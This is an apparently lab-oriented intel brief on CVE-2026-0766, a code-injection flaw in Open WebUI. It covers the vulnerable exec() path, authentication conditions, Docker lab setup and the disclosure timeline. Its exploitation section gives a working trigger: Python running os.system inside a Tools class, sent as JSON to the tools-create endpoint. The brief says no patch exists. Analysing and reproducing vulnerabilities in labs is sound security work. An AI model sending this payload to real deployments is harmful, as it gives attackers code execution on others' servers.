# Intel Brief: CVE-2026-0766

## CVE ID
CVE-2026-0766

## Affected Software
- **Name**: Open WebUI
- **Vendor**: open-webui (openwebui)
- **Repository**: https://github.com/open-webui/open-webui
- **Language**: Python (FastAPI backend) + SvelteKit frontend
- **Type**: Self-hosted AI chat interface

## CVSS Score
- **Score**: 8.8 (HIGH)
- **Vector**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **EPSS**: 0.6% (70.3th percentile)

## CWE Classification
- **CWE-94**: Improper Control of Generation of Code (Code Injection)

## Description
Open WebUI `load_tool_module_by_id` Command Injection Remote Code Execution Vulnerability. The function in `backend/open_webui/utils/plugin.py` executes user-supplied Python code via `exec(content, module.__dict__)` without any validation, sanitization, or sandboxing. An authenticated user who can create or update tools (admin by default, or any user with `workspace.tools` permission) can inject arbitrary Python code that executes on the server with the application's privilege level.

### Root Cause
The `load_tool_module_by_id()` function at `backend/open_webui/utils/plugin.py` line ~103 (in v0.6.32) directly passes user-supplied `content` to Python's `exec()` builtin. The content comes from:
1. **Tool creation**: POST `/api/v1/tools/create` — the `form_data.content` field
2. **Tool update**: POST `/api/v1/tools/id/{id}/update` — the `form_data.content` field
3. **Database load**: When a tool is loaded by ID, content is retrieved from the database and exec'd

### Vulnerable Code Path
```
POST /api/v1/tools/create
  → backend/open_webui/routers/tools.py::create_new_tools()
    → load_tool_module_by_id(form_data.id, content=form_data.content)
      → backend/open_webui/utils/plugin.py::load_tool_module_by_id()
        → exec(content, module.__dict__)  ← VULNERABILITY
```

### Authentication Requirements
- **Default config**: Only admin users can create tools (`workspace.tools` defaults to `False` for non-admin users via `USER_PERMISSIONS_WORKSPACE_TOOLS_ACCESS` env var)
- **Modified config**: If admin grants `workspace.tools` permission to regular users, any verified user can exploit this
- **First-user admin**: The first user to sign up on a fresh instance becomes admin automatically
- **Signup enabled by default**: `ENABLE_SIGNUP=True` by default

## Repository URL
https://github.com/open-webui/open-webui.git

## Vulnerable Version
- **Tag**: `v0.6.32`
- **Commit**: `37d1c85c996e1bdcd505e1e6d62b2f17acd8df23`
- **Note**: All versions from early development through at least v0.8.5 contain this vulnerability. The `exec()` call on user-supplied content is present in every release.

## Fix Commit
- **Status**: NO FIX AVAILABLE as of v0.8.5 (latest at time of analysis)
- **Rationale**: The `exec(content, module.__dict__)` call is present in all versions tested (v0.6.32 through v0.8.5). The ZDI advisory (ZDI-26-032) recommends restricting network access as mitigation rather than applying a patch.
- **The exec() exists in TWO places** in `plugin.py`: once in `load_tool_module_by_id()` (tools) and once in `load_function_module_by_id()` (functions)

## Patched Version
- **None identified** — vulnerability persists through v0.8.5 (Feb 23, 2026)

## Build System
- **Backend**: Python 3.11 + pip (requirements.txt with 152 dependencies)
- **Frontend**: Node.js 22 + npm (SvelteKit)
- **Containerization**: Multi-stage Dockerfile (node:22-alpine build stage → python:3.11-slim-bookworm runtime)
- **Startup**: `uvicorn open_webui.main:app` via `backend/start.sh`
- **Database**: SQLite (default) or PostgreSQL
- **Docker image**: `ghcr.io/open-webui/open-webui:v0.6.32`

### Lab Build Notes
- **Recommended approach**: Use the pre-built Docker image `ghcr.io/open-webui/open-webui:v0.6.32` for fastest lab setup
- **Port**: 8080 (internal), maps to 3000 by default in docker-compose
- **Data volume**: `/app/backend/data` (SQLite DB, uploads, cache)
- **Environment variables needed**:
  - `WEBUI_SECRET_KEY` — JWT secret (auto-generated if empty)
  - `ENABLE_SIGNUP=True` — enabled by default
- **No LLM backend required**: The vulnerability is in the tools API, not in chat functionality. No Ollama or OpenAI connection needed for exploitation.

## Key Dependencies (Backend)
- `fastapi==0.115.7` — Web framework
- `uvicorn[standard]==0.35.0` — ASGI server
- `pydantic==2.11.7` — Data validation
- `sqlalchemy==2.0.38` — ORM/database
- `python-jose==3.4.0` — JWT handling
- `passlib[bcrypt]==1.7.4` — Password hashing

## Public Exploits
- **None found** in EIP (no ExploitDB, Metasploit, GitHub PoCs, or Nuclei templates)
- **No public exploit code exists** — PoC must be written from scratch

## Exploitation Strategy (for PoC development)
1. **Setup**: Deploy Open WebUI v0.6.32 via Docker
2. **Authentication**: Sign up as the first user (automatically becomes admin), or sign up as regular user if admin has enabled `workspace.tools` permission
3. **Trigger**: POST to `/api/v1/tools/create` with a ToolForm payload where `content` contains malicious Python code embedded within a valid Tools class structure
4. **Payload**: The `content` field must contain valid Python that defines a `Tools` class (otherwise the function raises an exception), but code before the class definition executes during `exec()`:
   ```python
   import os
   os.system("id > /tmp/pwned")
   
   class Tools:
       pass
   ```
5. **API Request Format**:
   ```json
   {
     "id": "exploit_tool",
     "name": "Exploit",
     "content": "import os\nos.system('id > /tmp/pwned')\n\nclass Tools:\n    pass\n",
     "meta": {"description": "test", "manifest": {}}
   }
   ```
6. **Authentication header**: `Authorization: Bearer <jwt_token>` (obtained from `/api/v1/auths/signin` or `/api/v1/auths/signup`)

## References
- **ZDI Advisory**: https://www.zerodayinitiative.com/advisories/ZDI-26-032/ (ZDI-CAN-28257)
- **GHSA**: GHSA-cggw-334c-f4mj — https://github.com/advisories/GHSA-cggw-334c-f4mj
- **NVD**: https://nvd.nist.gov/vuln/detail/CVE-2026-0766
- **Source Repository**: https://github.com/open-webui/open-webui
- **Vulnerable File**: `backend/open_webui/utils/plugin.py` — `load_tool_module_by_id()` function
- **Vulnerable Router**: `backend/open_webui/routers/tools.py` — `create_new_tools()` and `update_tools_by_id()` endpoints

## Disclosure Timeline
- **2025-10-09**: Vulnerability reported to vendor (ZDI)
- **2026-01-09**: ZDI advisory published (ZDI-26-032)
- **2026-01-23**: CVE-2026-0766 published
- **2026-03-01**: No patch released as of analysis date
